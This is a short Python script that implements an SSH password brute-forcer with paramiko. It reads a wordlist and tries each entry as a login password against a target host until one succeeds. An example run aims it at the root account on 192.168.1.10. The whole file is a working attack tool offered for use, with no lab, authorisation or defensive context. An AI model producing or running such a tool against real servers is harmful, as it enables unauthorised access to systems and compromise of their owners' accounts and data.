import paramiko

class SSHBruteForce:
    def __init__(self, hostname, username, wordlist_path, port=22, timeout=3):
        self.hostname = hostname
        self.port = port
        self.username = username
        self.wordlist_path = wordlist_path
        self.timeout = timeout

    def run(self):
        with open(self.wordlist_path, "r", encoding="utf-8") as f:
            for line in f:
                password = line.strip()
                if self.try_login(password):
                    return {"success": True, "password": password}
        return {"success": False}

    def try_login(self, password):
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(self.hostname, port=self.port, username=self.username, password=password, timeout=self.timeout)
            client.close()
            return True
        except:
            return False

# Example
if __name__ == "__main__":
    bf = SSHBruteForce("192.168.1.10", "root", "wordlists/ssh.txt")
    print(bf.run())
